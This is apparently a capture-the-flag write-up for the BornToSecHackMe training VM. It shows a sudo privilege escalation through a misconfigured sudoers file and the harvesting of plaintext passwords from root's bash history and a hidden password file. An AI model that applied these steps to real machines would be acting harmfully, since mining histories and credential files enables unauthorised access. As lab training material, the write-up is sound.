# bash_history

we come from writeup4, we can make normal user have full right for the system
```sh
 vi /etc/sudoers

  1 #
  2 # This file MUST be edited with the 'visudo' command as root.
  3 #
  4 # Please consider adding local content in /etc/sudoers.d/ instead of
  5 # directly modifying this file.
  6 #
  7 # See the man page for details on how to write a sudoers file.
  8 #
  9 Defaults        env_reset
 10 Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 11
 12 # Host alias specification
 13
 14 # User alias specification
 15
 16 # Cmnd alias specification
 17
 18 # User privilege specification
 19 root    ALL=(ALL:ALL) ALL
 20 laurie  ALL=(ALL:ALL) ALL
 21
 22 # Members of the admin group may gain root privileges
 23 %admin ALL=(ALL) ALL
 24
 25 # Allow members of group sudo to execute any command
 26 %sudo   ALL=(ALL:ALL) ALL
 27
 28 # See sudoers(5) for more information on "#include" directives:
 29
 30 #includedir /etc/sudoers.d
```

from line 20, we see that laurie has full right on the machine with sudo
so we ssh into laurie's machine with user laurie and the password 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
`laurie@BornToSecHackMe:~$ sudo su
[sudo] password for laurie:
root@BornToSecHackMe:/home/laurie# ls`

now laurie has the right like root user

```sh
root@BornToSecHackMe:/home/laurie# cd /
root@BornToSecHackMe:/# ls
bin   cdrom  etc   initrd.img  media  opt   rofs  run   selinux  sys  usr  vmlinuz
boot  dev    home  lib         mnt    proc  root  sbin  srv      tmp  var
root@BornToSecHackMe:/# cd root
root@BornToSecHackMe:~# ls -al
total 31
drwx------ 5 root root   150 Oct 15  2015 .
drwxr-xr-x 1 root root   220 Oct 29 09:33 ..
drwx------ 2 root root    29 Oct  8  2015 .aptitude
-rw------- 1 root root 20932 Oct 15  2015 .bash_history
-rw-r--r-- 1 root root  3106 Apr 19  2012 .bashrc
-rw-r--r-- 1 root root   140 Apr 19  2012 .profile
-rw------- 1 root root  1024 Oct  8  2015 .rnd
drwx------ 2 root root    34 Oct  8  2015 .ssh
drwxr-xr-x 2 root root    33 Oct 13  2015 .vim
-rw------- 1 root root  4246 Oct 15  2015 .viminfo
-rw-r--r-- 1 root root    40 Oct 15  2015 README
```

there is .bash_history
let's have a look

```sh
mkdir README
cd README/
ls
touch password
vim password
cd ..
ls
mv README/ LOOKATME
cd LOOKATME/
```

interesting, history shows that creacted a folder called README and after made a file password
I guess there is password inside?
let's have a look?
where is this file?
```sh
find / | grep LOOKATME
/home/LOOKATME
/home/LOOKATME/password
/rofs/home/LOOKATME
/rofs/home/LOOKATME/password
```

so...
```sh
 cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

we have the passward for lmezard

anything else?
```sh
su thor
adduser zaz
646da671ca01bb5d84dbb5fb2238dc8e
cd ../zaz
```

we even have the password of zaz right away.